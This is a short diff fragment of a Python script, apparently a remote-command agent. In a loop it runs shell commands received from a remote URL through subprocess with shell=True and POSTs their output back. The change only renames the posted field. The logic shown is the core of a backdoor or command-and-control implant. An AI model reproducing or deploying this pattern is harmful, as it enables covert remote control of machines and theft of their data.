@@ -31,7 +31,7 @@ while True:
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
             result  = CMD.stdout.read()
-            post_response = requests.post(urltosearch, {command:result})
+            post_response = requests.post(urltosearch, {"result":result})
 
     else:
         time.sleep(3)
